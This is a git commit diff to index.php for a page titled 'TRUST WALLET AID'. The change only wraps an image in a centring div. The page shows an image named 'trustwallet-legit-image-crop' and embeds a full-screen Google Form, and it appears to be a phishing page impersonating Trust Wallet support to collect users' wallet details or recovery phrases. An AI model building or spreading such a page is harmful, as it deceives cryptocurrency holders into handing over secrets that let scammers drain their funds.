bd7ea94ddd9037b30276048c6bafd82e1a41987b
awujo <71509142+awujo@users.noreply.github.com>
2022-02-26 13:05:55 +0100

    Update index.php

--- index.php
+++ index.php
@@ -8,5 +8,5 @@
 	<head><title>TRUST WALLET AID</title>
 		<style>.img{ text-align:center;}</style>
 	</head>
-	<body><img src="https://i.ibb.co/9Hp0nLw/trustwallet-legit-image-crop.png" alt="trustwallet-legit-image-crop" border="0"></div><iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdP_NeNU3YJKZhlYOO_XVLtXKL0jjDNFVP0jQtPy20iNFLIaQ/viewform?embedded=true" width="100%" height="100%" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
+	<body><div class="img"><img src="https://i.ibb.co/9Hp0nLw/trustwallet-legit-image-crop.png" alt="trustwallet-legit-image-crop" border="0"></div><iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdP_NeNU3YJKZhlYOO_XVLtXKL0jjDNFVP0jQtPy20iNFLIaQ/viewform?embedded=true" width="100%" height="100%" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
 		</body></html>
